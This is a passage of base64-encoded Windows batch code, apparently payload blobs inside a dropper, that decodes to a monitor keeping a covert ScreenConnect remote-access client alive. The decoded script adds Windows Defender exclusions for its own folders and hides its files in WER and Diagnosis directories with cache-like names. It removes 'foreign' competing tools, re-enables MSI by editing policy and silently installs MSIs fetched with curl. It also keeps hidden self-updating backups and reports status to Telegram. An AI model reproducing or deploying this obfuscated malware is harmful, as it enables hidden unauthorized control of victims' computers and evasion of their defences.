Yi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJUFMVF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+PiIl
TE9HJSIgMj4mMQopCnJlbSAoZXh0ZXJtaW5hdGlvbiBhbHJlYWR5IHJhbiBwcmUtaGVhbCBpbiBb
RV07IGZvcmVpZ24gc3Vydml2b3JzIGNvdW50ZWQgdGhlcmUpCgpyZW0g4pSA4pSAIFtGXSBzdGVh
bHRoIHJlLXNlY3VyZSAocXVpZXQgRGVmZW5kZXIgZXhjbHVzaW9uIHJlZnJlc2gpIOKUgOKUgApw
b3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
YXNzIC1Db21tYW5kICJ0cnkgeyBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICclV0Ql
JywnJUVUTCUnIC1FcnJvckFjdGlvbiBTdG9wIH0gY2F0Y2gge30iID5udWwgMj4mMQoKcmVtIOKU
gOKUgCBbR10gcGVyaW9kaWMgZnVsbCByZS1zZWN1cmUgZXZlcnkgfjIgaCDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKcG93ZXJzaGVs
bCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKFRlc3QtUGF0aCAnJVdE
JVxvd25fc2VjdXJlLmNtZCcpIC1hbmQgKCggLW5vdCAoVGVzdC1QYXRoICclV0QlXHNlYy5mbGFn
JykpIC1vciAoKChHZXQtRGF0ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclV0QlXHNlYy5m
bGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxIb3VycyAtZ2UgMikpKXsgZXhpdCAxIH0gZWxzZSB7
IGV4aXQgMCB9IiA+bnVsIDI+JjEKaWYgZXJyb3JsZXZlbCAxICgKICBlY2hvIHBlcmlvZGljIHJl
LXNlY3VyZT4+IiVMT0clIgogIGNhbGwgIiVXRCVcb3duX3NlY3VyZS5jbWQiID4+IiVMT0clIiAy
PiYxCiAgZWNobyBkb25lPiIlV0QlXHNlYy5mbGFnIgopCgpyZW0g4pSA4pSAIFtHMl0gR3J5eGEg
TVVTVC1SVU4g4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSACnJlbSBPNDA6IGlmIEFOWSBub24tc2V2cnogU0MgUnVubmluZyDihpIgbmV2
ZXIgbXNpZXhlYyAoc3RvcHMgcGFuZWwgZHVwbGljYXRlcykuCnNldCAiR1JZWEFfT0s9MCIKc2V0
ICJHUllYQV9XQVM9MCIKc2V0ICJET19ERUVQPTAiCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIg
Zm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhh
LmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwiCgpy
ZW0gRGV0ZWN0IGFueSBSdW5uaW5nIG5vbi1zZXZyeiBTY3JlZW5Db25uZWN0ICh0cnVlIEdyeXhh
IHByZXNlbmNlKQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
b25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGdyeXhhLWhl
YWx0aCAtV29ya0RpciAiJVdEJSIgPiIlV0QlXGdyeXhhX2hlYWx0aC5vdXQiIDI+bnVsCnNldCAi
R0g9IgppZiBleGlzdCAiJVdEJVxncnl4YV9oZWFsdGgub3V0IiBmb3IgL2YgInVzZWJhY2txIGRl
bGltcz0iICUlUiBpbiAoIiVXRCVcZ3J5eGFfaGVhbHRoLm91dCIpIGRvIHNldCAiR0g9JSVSIgpl
Y2hvIGdyeXhhX2hlYWx0aD0hR0ghPj4iJUxPRyUiCmVjaG8gIUdIIXwgZmluZHN0ciAvSSAvQiAv
QzoiSEVBTFRIWSIgPm51bAppZiBub3QgZXJyb3JsZXZlbCAxICgKICBzZXQgIkdSWVhBX09LPTEi
CiAgc2V0ICJHUllYQV9XQVM9MSIKICBpZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAi
dXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmciKSBk
byBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIgopCgpwb3dlcnNo
ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoIC1ub3QgKFRlc3Qt
UGF0aCAnJUdSWVhBX0RFRVAlJykpIC1vciAoKChHZXQtRGF0ZSktKEdldC1JdGVtIC1MaXRlcmFs
UGF0aCAnJUdSWVhBX0RFRVAlJyAtRm9yY2UpLkxhc3RXcml0ZVRpbWUpLlRvdGFsSG91cnMgLWdl
IDgpKXsgZXhpdCAxIH0gZWxzZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjEKaWYgZXJyb3JsZXZlbCAx
IHNldCAiRE9fREVFUD0xIgoKcmVtIEhlYWx0aHkgKyBub3QgZGVlcCBkdWUg4oaSIHplcm8gd29y
awppZiAiJUdSWVhBX09LJSI9PSIxIiBpZiAiJURPX0RFRVAlIj09IjAiICgKICBlY2hvIGdyeXhh
X3NraXBfYWxyZWFkeV9oZWFsdGh5Pj4iJUxPRyUiCiAgZ290byA6R3J5eGFBZnRlcgopCgpyZW0g
RGVlcCBvciBtaXNzaW5nOiBncnl4YS1lbnN1cmUgb25seSAobGliIGxvY2tzIG1zaWV4ZWMgaWYg
UnVubmluZykKaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgKICBzZXQgIkdSRVM9IgogIGlm
ICIlRE9fREVFUCUiPT0iMSIgKAogICAgZWNobyBncnl4YV9kZWVwX2JlZ2luPj4iJUxPRyUiCiAg
ICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmls
ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
X2xpYi5wczEiIC1BY3Rpb24gZ3J5eGEtZW5zdXJlIC1EZWVwIC1Xb3JrRGlyICIlV0QlIiAtQnVp
bGQgJU1PTlZFUiVgKSBkbyBzZXQgIkdSRVM9JSVSIgogICkgZWxzZSAoCiAgICBmb3IgL2YgInVz
ZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1B
Y3Rpb24gZ3J5eGEtZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiVgKSBkbyBz
ZXQgIkdSRVM9JSVSIgogICkKICBlY2hvIGdyeXhhX2Vuc3VyZV9yZXN1bHQ9IUdSRVMhPj4iJUxP
RyUiCiAgZWNobyAhR1JFUyF8IGZpbmRzdHIgL0kgL0IgL0M6IkhFQUxUSFkiID5udWwKICBpZiBu
b3QgZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFfT0s9MSIKKQppZiAiJURPX0RFRVAlIj09IjEiIGVj
aG8gZG9uZT4iJUdSWVhBX0RFRVAlIgppZiAiJUdSWVhBX09LJSI9PSIwIiBjYWxsIDpFbnN1cmVH
cnl4YU11c3QKCjpHcnl4YUFmdGVyCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1
c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIpIGRv
IGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwiCnNjIHF1ZXJ5ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bApp
ZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFfT0s9MSIKcmVtIGFsc28gT0sgaWYgYW55IG5v
bi1zZXZyeiBzdGlsbCBydW5uaW5nCmlmICIlR1JZWEFfT0slIj09IjAiICgKICBwb3dlcnNoZWxs
IC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxl
ICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGdyeXhhLWhlYWx0aCAtV29ya0RpciAiJVdEJSIg
Mj5udWwgfCBmaW5kc3RyIC9JIC9CIC9DOiJIRUFMVEhZIiA+bnVsCiAgaWYgbm90IGVycm9ybGV2
ZWwgMSBzZXQgIkdSWVhBX09LPTEiCikKCmlmICIlR1JZWEFfT0slIj09IjEiIGlmICIlR1JZWEFf
V0FTJSI9PSIwIiAoCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhl
Y3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0
ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAiZ3J5eGEtcmVzdG9yZWQi
ID5udWwgMj4mMQogIGNhbGwgOlRnU3RhdGUgUkVTVE9SRUQgIkdyeXhhIFNjcmVlbkNvbm5lY3Qg
aGVhbHRoeSAoc3ZjIHJ1bm5pbmcpIgopCmlmICIlR1JZWEFfT0slIj09IjAiICgKICBwb3dlcnNo
ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVp
bGQgJU1PTlZFUiUgLUV4dHJhICJncnl4YS1tdXN0LWZhaWwiID5udWwgMj4mMQogIGNhbGwgOlRn
U3RhdGUgRE9XTiAiR3J5eGEgTVVTVC1SVU4gLSBzZXJ2aWNlIG5vdCBSdW5uaW5nIGFmdGVyIGhl
YWwiCikKCnJlbSDilIDilIAgW0hdIHF1aWV0IGRpZ2VzdCAoc2tpcCBoZWFsdGh5IGhvc3RzIOKA
lCB3YXMgZmxvb2RpbmcgVGVsZWdyYW0pIOKUgOKUgAppZiBleGlzdCAiJVdEJVxvd25fbGliLnBz
MSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5
IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAi
JVdEJSIgLUJ1aWxkICVNT05WRVIlID5udWwgMj4mMQpzZXQgIk5FRURfSEI9MCIKaWYgIiVQUklN
X09LJSI9PSIwIiBzZXQgIk5FRURfSEI9MSIKaWYgJUZPUkVJR05fTEVGVCUgR1RSIDAgc2V0ICJO
RUVEX0hCPTEiCmlmICIlR1JZWEFfT0slIj09IjAiIHNldCAiTkVFRF9IQj0xIgppZiAiJU5FRURf
SEIlIj09IjAiICgKICBlY2hvIGhiX3NraXBfaGVhbHRoeT4+IiVMT0clIgopIGVsc2UgKAogIHBv
d2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChUZXN0LVBh
dGggJyVIQkZMQUclJykgLWFuZCAoTmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVy
YWxQYXRoICclSEJGTEFHJScpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgMzYwKXsg
ZXhpdCAwIH0gZWxzZSB7IGV4aXQgMSB9IiA+bnVsIDI+JjEKICBpZiBlcnJvcmxldmVsIDEgKAog
ICAgZWNobyBoYj4lSEJGTEFHJQogICAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFj
dGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAt
U3RhdGUgSEIgLU1vZGUgY29tcGFjdCAtQnVpbGQgJU1PTlZFUiUgLUNvdW50ICFDT1VOVCEgPm51
bCAyPiYxCiAgICBlY2hvIGRpZ2VzdCBIQiBzZW50Pj4iJUxPRyUiCiAgKQopCgpyZW0g4pSA4pSA
IFtJXSBzZWxmLXVwZGF0ZSBhcHBseSAobGFzdCB0aGluZyB0aGlzIHRpY2spIOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAppZiAiJVNFTEZfVVBEJSI9PSIxIiAoCiAg
ZWNobyBzZWxmLXVwZGF0ZSBhcHBseT4+IiVMT0clIgogIGF0dHJpYiAtaCAtcyAtciAiJVdEJVxv
d25fbW9uLmNtZCIgPm51bCAyPiYxCiAgbW92ZSAveSAiJVdEJVxvd25fbW9uLm5leHQiICIlV0Ql
XG93bl9tb24uY21kIiA+bnVsIDI+JjEKKQpyZW0ga2VlcCBkdWFsLXBhdGggYmFja3VwIGluIHN5
bmMgZXZlcnkgdGljawppZiBub3QgZXhpc3QgIiVFVEwlIiBta2RpciAiJUVUTCUiID5udWwgMj4m
MQppZiBleGlzdCAiJVdEJVxvd25fbW9uLmNtZCIgKAogIGF0dHJpYiAtaCAtcyAtciAiJUVUTCVc
ZXRsX21vbi5jbWQiID5udWwgMj4mMQogIGNvcHkgL3kgIiVXRCVcb3duX21vbi5jbWQiICIlRVRM
JVxldGxfbW9uLmNtZCIgPm51bCAyPiYxCikKZGVsIC9mIC9xICIlTVVURVglIiA+bnVsIDI+JjEK
CmVjaG8gdGljayBkb25lOiBwcmltPSVQUklNX09LJSBncnl4YT0lR1JZWEFfT0slIGFsdD0lQUxU
X09LJSBmb3JlaWduPSVGT1JFSUdOX0xFRlQlPj4iJUxPRyUiCmVuZGxvY2FsCmV4aXQgL2IgMAoK
cmVtIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCBoZWxwZXJz
IOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAo6RW5zdXJlR3J5
eGFNdXN0CnJlbSBPNDE6IHRoaW4gd3JhcHBlciAtIG5ldmVyIG1zaWV4ZWM7IGdyeXhhLWVuc3Vy
ZSArIFJ1bm5pbmcgbG9jay4Kc2V0ICJHUllYQV9PSz0wIgppZiBleGlzdCAiJVdEJVxvd25fbGli
LnBzMSIgKAogIHNldCAiR1JFUz0iCiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4g
KGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kg
QnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGdyeXhhLWVuc3VyZSAtV29y
a0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlYCkgZG8gc2V0ICJHUkVTPSUlUiIKICBlY2hvIGdy
eXhhX211c3RfbGliPSFHUkVTIT4+IiVMT0clIgogIGVjaG8gIUdSRVMhfCBmaW5kc3RyIC9JIC9C
IC9DOiJIRUFMVEhZIiA+bnVsCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEi
CikKaWYgZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCog
ZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kgIiUlSyI9PSJDVVJS
RU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCIKc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglR1JZWEFfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsCmlmIG5vdCBlcnJvcmxldmVsIDEg
c2V0ICJHUllYQV9PSz0xIgppZiAiJUdSWVhBX09LJSI9PSIxIiAoZWNobyBncnl4YV9tdXN0X3J1
bm5pbmdfb2s+PiIlTE9HJSIpIGVsc2UgKGVjaG8gZ3J5eGFfbXVzdF9zdGlsbF9kb3duPj4iJUxP
RyUiKQpleGl0IC9iIDAKCjpJbnN0YWxsTXNpCnJlbSAlMT11cmwgJTI9dGFnCnNldCAiVVJMPSV+
MSIKc2V0ICJUQUc9JX4yIgplY2hvIFslVEFHJV0gZmV0Y2ggJVVSTCU+PiIlTE9HJSIKIiVDVVJM
JSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tbWF4LXRpbWUgMzAw
IC1vICIlTVNJJS50bXAiICIlVVJMJSIgPj4iJUxPRyUiIDI+JjEKZm9yICUlRiBpbiAoIiVNU0kl
LnRtcCIpIGRvIGlmICUlfnpGIExFUSAxMDAwMDAwICgKICBlY2hvIFslVEFHJV0gZmV0Y2ggZmFp
bGVkPj4iJUxPRyUiCiAgZGVsIC9mIC9xICIlTVNJJS50bXAiID5udWwgMj4mMQogIGV4aXQgL2Ig
MQopCm1vdmUgL3kgIiVNU0klLnRtcCIgIiVNU0klIiA+bnVsIDI+JjEKY2FsbCA6Tm9Nc2lQb2xp
Y3kKcmVtIE0xMzogc3RhbGUgcHJpbWFyeSBkaXIgKHNlcnZpY2UgZGVsZXRlZCwgcHJvZHVjdCB1
bnJlZ2lzdGVyZWQpIGJyZWFrcwpyZW0gdGhlIFNDIGluc3RhbGxlciBjdXN0b20gYWN0aW9uIC0g
Y2xlYXIgaXQgYmVmb3JlIGluc3RhbGxpbmcKc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUF9GUCUpIiA+bnVsIDI+JjEKaWYgZXJyb3JsZXZlbCAxIGlmIGV4aXN0ICIlUEY4NiVc
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiICgKICBlY2hvIHN0YWxlX3ByaW1hcnlf
ZGlyX2NsZWFuPj4iJUxPRyUiCiAgcm1kaXIgL3MgL3EgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENs
aWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxCikKZWNobyBbJVRBRyVdIG1zaWV4ZWMgaW5zdGFs
bD4+IiVMT0clIgptc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBS
RUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQpz
ZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIgplY2hvIFslVEFHJV0gbXNpZXhlYyBleGl0PSFNU0lF
WElUIT4+IiVMT0clIgppZiAiIU1TSUVYSVQhIj09IjE2MTgiICgKICBlY2hvIFslVEFHJV0gbXNp
X2J1c3lfcmV0cnk+PiIlTE9HJSIKICB0aW1lb3V0IC90IDMwIC9ub2JyZWFrID5udWwKICBtc2ll
eGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3Vw
cHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbDIubG9nIiA+bnVsIDI+JjEKICBzZXQgIk1TSUVYSVQ9
IUVSUk9STEVWRUwhIgogIGVjaG8gWyVUQUclXSBtc2lleGVjX3JldHJ5IGV4aXQ9IU1TSUVYSVQh
Pj4iJUxPRyUiCikKY2FsbCA6V2FpdFN2YwpjYWxsIDpSZXN0b3JlQWx0CnJlbSBPMzc6IHNldnJ6
IC9pIHNoYXJlcyBsZWdhY3kgVXBncmFkZUNvZGVzIHdpdGggZ3J5eGEg4oCUIGFsd2F5cyByZS1l
bnN1cmUgR3J5eGEgYWZ0ZXIKY2FsbCA6RW5zdXJlR3J5eGFNdXN0CmV4aXQgL2IgMApyZW0gJTE9
ZmluZ2VycHJpbnQgLSBzZXJ2aWNlIGRlbGV0ZWQgYnV0IHByb2R1Y3QgcmVnaXN0ZXJlZDogcmVw
YWlyIGJ5IEdVSUQuCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJX4xKSIgPm51bCAy
PiYxCmlmIG5vdCBlcnJvcmxldmVsIDEgZXhpdCAvYiAwCmlmIG5vdCBleGlzdCAiJVdEJVxvd25f
bGliLnBzMSIgZXhpdCAvYiAxCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24g
cmVwYWlyIC1GcCAiJX4xIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEKY2FsbCA6V2Fp
dFN2YwpleGl0IC9iIDAKCjpSZXN0b3JlQWx0CnJlbSBBTFQgc2VydmljZSBnb25lIGJ1dCBzdGls
bCByZWdpc3RlcmVkIChTQy1mYW1pbHkgbXNpZXhlYyBzaWRlIGVmZmVjdCkgLSByZXBhaXIgaXQg
dG9vLgpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYx
CmlmIG5vdCBlcnJvcmxldmVsIDEgZXhpdCAvYiAwCmVjaG8gYWx0IG1pc3NpbmcgLSByZXBhaXIg
YXR0ZW1wdD4+IiVMT0clIgppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIg
IiVXRCUiID4+IiVMT0clIiAyPiYxCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFM
VF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwKaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkFM
VF9PSz0xIgpleGl0IC9iIDAKCjpOb01zaVBvbGljeQpyZWcgZGVsZXRlICJIS0xNXFNPRlRXQVJF
XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvZiA+
bnVsIDI+JjEKcmVnIGRlbGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2lu
ZG93c1xJbnN0YWxsZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxCnJlZyBhZGQgIkhLTE1c
U09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxl
TVNJIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQpleGl0IC9iIDAKCjpXYWl0U3ZjCnNl
dCAiVFJJRVM9MCIKOldhaXRMb29wCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
RVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsCmlmIG5vdCBlcnJvcmxldmVsIDEgKAogIHNl
dCAiSU5TVEFMTEVEPTEiCiAgc2V0ICJQUklNX09LPTEiCiAgZXhpdCAvYiAwCikKc2V0IC9hIFRS
SUVTKz0xCmlmICVUUklFUyUgR0VRIDEwIGV4aXQgL2IgMQpwaW5nIDEyNy4wLjAuMSAtbiA3ID5u
dWwgMj4mMQpnb3RvIDpXYWl0TG9vcAoKOlRnU3RhdGUKc2V0ICJORVdTVEFURT0lfjEiCnNldCAi
TVNHPSV+MiIKc2V0ICJPTERTVEFURT0iCmlmIGV4aXN0ICIlU1RBVEUlIiBzZXQgL3AgT0xEU1RB
VEU9PCIlU1RBVEUlIgpyZW0gZmFsc2UgRE9XTiBhZnRlciByZWJvb3QgcmFjZTogcHJpbWFyeSBh
bHJlYWR5IFJ1bm5pbmcg4oCUIGRvIG5vdCBzcGFtCmlmIC9JICIlTkVXU1RBVEUlIj09IkRPV04i
ICgKICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAi
UlVOTklORyIgPm51bAogIGlmIG5vdCBlcnJvcmxldmVsIDEgKAogICAgZWNobyB0Z19za2lwX2Rv
d25fYWxyZWFkeV9ydW5uaW5nPj4iJUxPRyUiCiAgICBleGl0IC9iIDAKICApCikKcmVtIHJhdGUt
bGltaXQgcmVwZWF0ZWQgRE9XTi9GQUlMOiBtYXggMSBhbGVydCBwZXIgNmggd2hpbGUgc3R1Y2sK
aWYgL0kgIiVORVdTVEFURSUiPT0iRE9XTiIgZ290byA6TWF5YmVTdXBwcmVzcwppZiAvSSAiJU5F
V1NUQVRFJSI9PSJGQUlMIiBnb3RvIDpNYXliZVN1cHByZXNzCmdvdG8gOlNlbmRBbGVydAo6TWF5
YmVTdXBwcmVzcwppZiAvSSAiJU5FV1NUQVRFJSI9PSIlT0xEU1RBVEUlIiBpZiBleGlzdCAiJVdE
JVx0Z19zZW50LmZsYWciICgKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
IC1Db21tYW5kICJpZigoTmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRo
ICclV0QlXHRnX3NlbnQuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgMzYw
KXtleGl0IDB9ZWxzZXtleGl0IDF9IiA+bnVsIDI+JjEKICBpZiBub3QgZXJyb3JsZXZlbCAxICgK
ICAgIGVjaG8gdGdfc3VwcHJlc3NlZF8lTkVXU1RBVEUlPj4iJUxPRyUiCiAgICBleGl0IC9iIDAK
ICApCikKOlNlbmRBbGVydAplY2hvICVORVdTVEFURSU+IiVTVEFURSUiCmVjaG8gc2VudD4iJVdE
JVx0Z19zZW50LmZsYWciCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4
ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcdGdfcmVwb3J0LnBzMSIgLVN0YXRlICVO
RVdTVEFURSUgLVN1bW1hcnkgIiVNU0clIiAtQnVpbGQgJU1PTlZFUiUgLUNvdW50ICVDT1VOVCUg
Pm51bCAyPiYxCmVjaG8gdGcgc3RhdGUgJU5FV1NUQVRFJSBzZW50Pj4iJUxPRyUiCmV4aXQgL2Ig
MAo=
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM5IC0gZHluYW1pYyBncnl4
YSBGUCBmcm9tIGdyeXhhLmNmZzsgTk8gTG9ja0RpciBvbiBTQyBkaXJzDQpzZXRsb2NhbCBFbmFi
bGVFeHRlbnNpb25zIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCnNldCAiV0Q9JVByb2dyYW1EYXRh
JVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSINCnNldCAiV0QyPSVQcm9ncmFt
RGF0YSVcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxPRz0lV0Ql
XGJvb3QuZXJyIg0Kc2V0ICJQUklNPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJl
NTA3KSINCnNldCAiQUxUPVNjcmVlbkNvbm5lY3QgQ2xpZW50IChmODYxYzgxNDBkNDUzNDI3KSIN
CnNldCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VFUDI9Zjg2MWM4MTQwZDQ1MzQy
NyINCnNldCAiS0VFUDM9OTkwODE5OGU2NjhlNDc1MCINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNm
ZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdy
eXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJLRUVQMz0lJUwiDQpz
ZXQgIkdSWVhBPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCnNldCAiUEY9JVByb2dy
YW1GaWxlcyUiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiVEFTS1JPT1Q9
